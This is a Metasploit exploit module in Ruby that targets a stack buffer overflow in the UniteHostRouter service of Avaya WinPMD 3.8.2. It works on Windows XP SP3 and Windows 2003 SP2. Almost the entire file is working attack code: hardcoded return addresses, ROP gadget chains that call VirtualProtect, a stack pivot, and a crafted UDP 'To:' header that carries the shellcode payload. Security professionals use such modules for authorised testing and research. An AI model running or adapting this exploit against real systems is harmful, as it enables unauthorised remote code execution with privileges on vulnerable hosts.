##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Avaya WinPMD UniteHostRouter Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Avaya WinPMD. The vulnerability
				exists in the UniteHostRouter service, due to the insecure usage of memcpy when
				parsing specially crafted "To:" headers. The module has been tested successfully on
				Avaya WinPMD 3.8.2 over Windows XP SP3 and Windows 2003 SP2.
			},
			'Author'         =>
				[
					'Abdul-Aziz Hariri', # Vulnerability discovery
					'Abysssec', # PoC
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					['OSVDB', '82764'],
					['OSVDB', '73269'],
					['BID', '47947'],
					['EDB', '18397'],
					['URL', 'https://downloads.avaya.com/css/P8/documents/100140122'],
					['URL', 'http://secunia.com/advisories/44062']
				],
			'Payload'        =>
				{
					'BadChars' => "\x00\x0d\x0a\x20\x2f\x3a\x3f",
					'Space' => 1024,
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Avaya WinPMD 3.8.2 / Windows XP SP3',
						{
							'Offset' => 260,
							'Ret' => 0x77c2e93b # MOV EAX,EDI # POP EDI # RETN from msvcrt
						}
					],
					['Avaya WinPMD 3.8.2 / Windows 2003 SP2',
						{
							'Offset' => 260,
							'Ret' => 0x0040e0f2 # ADD ESP,44 # POP ESI # ADD ESP,0C8 # RETN from UniteHostRouter.EXE
						}
					]
				],
			'Privileged'     => true,
			'DisclosureDate' => 'May 23 2011',
			'DefaultTarget'  => 0
			))

		register_options([ Opt::RPORT(3217) ], self.class)
	end

	def junk(n=4)
		return rand_text_alpha(n).unpack("V")[0].to_i
	end

	def nop
		return make_nops(4).unpack("V")[0].to_i
	end

	def exploit
		connect_udp

		if target.name =~ /Windows XP SP3/
			buf = "\xeb\x7f" # jmp short $+0x81
			buf << rand_text(0x81 - 2)
			buf << "\xeb\x7f" # jmp short $+0x81
			buf << rand_text(0x81 - 2)
			buf << "\xeb\x64" # jmp short $+0x66 # jmp to shellcode in the heap
			buf << [target.ret].pack("V") # MOV EAX,EDI # POP EDI # RETN # from msvcrt # EDI points to data in the heap
			buf << [0x77c5f9a0].pack("V") # Readable address with string # from msvcrt
			buf << ([0x77c3c99c].pack("V")) * 21 # (INC EAX # RETN) * 21 # from msvcrt # EAX points to data in th heap, align to shellcode position
			buf << [0x77c168cd].pack("V") # jmp eax # from msvcrt.dll # JMP to shellcode in the heap
		elsif target.name =~ /Windows 2003 SP2/
			rop_gadgets =
				[
					0x77bb2563, # POP EAX # RETN
					0x77ba1114, # <- *&VirtualProtect()
					0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
					junk,
					0x77bb0c86, # XCHG EAX,ESI # RETN
					0x77bc9801, # POP EBP # RETN
					0x77be2265, # ptr to 'push esp #  ret'
					0x77bb2563, # POP EAX # RETN
					0x03C0990F,
					0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
					0x77bb48d3, # POP EBX, RET
					0x77bf21e0, # .data
					0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
					0x77bbfc02, # POP ECX # RETN
					0x77bef001, # W pointer (lpOldProtect) (-> ecx)
					0x77bd8c04, # POP EDI # RETN
					0x77bd8c05, # ROP NOP (-> edi)
					0x77bb2563, # POP EAX # RETN
					0x03c0984f,
					0x77bdd441, # SUB EAX, 03c0940f
					0x77bb8285, # XCHG EAX,EDX # RETN
					0x77bb2563, # POP EAX # RETN
					nop,
					0x77be6591, # PUSHAD # ADD AL,0EF # RETN
				].pack("V*")
			buf = rand_text(3) # padding
			buf << rop_gadgets
			buf << "\xeb\x7f" # jmp $+0x81
			buf << rand_text(0x81-2)
			buf << "\xeb\x25" # jmp short $+0x66 => to shellcode
			buf << rand_text(target['Offset'] - buf.length)
			buf << "\xf2\xe0\x40" # EIP => # ADD ESP,44 # POP ESI # ADD ESP,0C8 # RETN from [UniteHostRouter.EXE # stackpivot to heap
		end

		request = "UTP/1 To: 127.0.0.1 /#{buf}\r\n\r\n"

		if target.name =~ /Windows 2003 SP2/
			request << "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
		end

		request << payload.encoded # The shellcode will be stored in the heap

		print_status("#{rhost}:#{rport} - Trying to exploit #{target.name}...")
		udp_sock.put(request)
		disconnect_udp
	end

end
